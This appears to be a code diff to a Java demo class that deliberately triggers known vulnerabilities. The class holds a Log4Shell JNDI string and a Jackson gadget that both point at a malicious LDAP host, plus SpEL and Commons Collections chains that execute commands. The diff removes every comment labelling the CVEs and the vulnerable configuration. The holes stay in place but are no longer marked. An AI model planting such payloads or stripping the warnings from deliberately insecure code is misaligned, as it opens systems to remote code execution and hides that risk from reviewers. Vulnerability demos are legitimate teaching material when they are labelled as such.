@@ -23,17 +23,14 @@ public class App {
     }
 
     public static void demonstrateVulnerabilities() {
-        // Log4j vulnerability demonstration (CVE-2021-44228)
         String userInput = "${jndi:ldap://malicious-server.com/exploit}";
         logger.info("User input: {}", userInput);
 
-        // Spring Expression Language injection vulnerability (CVE-2022-22965)
         ExpressionParser parser = new SpelExpressionParser();
         String spelInput = "T(java.lang.Runtime).getRuntime().exec('calc.exe')";
         Expression exp = parser.parseExpression(spelInput);
         exp.getValue();
 
-        // Hibernate SQL Injection vulnerability (CVE-2019-14900)
         try {
             SessionFactory sessionFactory = new Configuration()
                     .configure()
@@ -47,29 +44,25 @@ public class App {
             logger.error("Database error", e);
         }
 
-        // Jackson Databind RCE vulnerability (CVE-2019-12384)
         try {
             ObjectMapper mapper = new ObjectMapper();
-            mapper.enableDefaultTyping(); // Vulnerable configuration
+            mapper.enableDefaultTyping();
             String json = "{\"@class\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://malicious-server/exploit\"}";
             mapper.readValue(json, Object.class);
         } catch (Exception e) {
             logger.error("Jackson deserialization error", e);
         }
 
-        // Apache Commons Collections deserialization vulnerability (CVE-2015-7501)
         try {
             Map<String, String> innerMap = new HashMap<String, String>();
             innerMap.put("key", "value");
             
-            // Create transformer chain for malicious execution
             InvokerTransformer transformer = new InvokerTransformer(
                 "exec", 
                 new Class[] {String.class}, 
                 new Object[] {"calc.exe"}
             );
             
-            // Create vulnerable transformed map
             Map outerMap = TransformedMap.decorate(innerMap, null, transformer);
         } catch (Exception e) {
             logger.error("Commons Collections error", e);
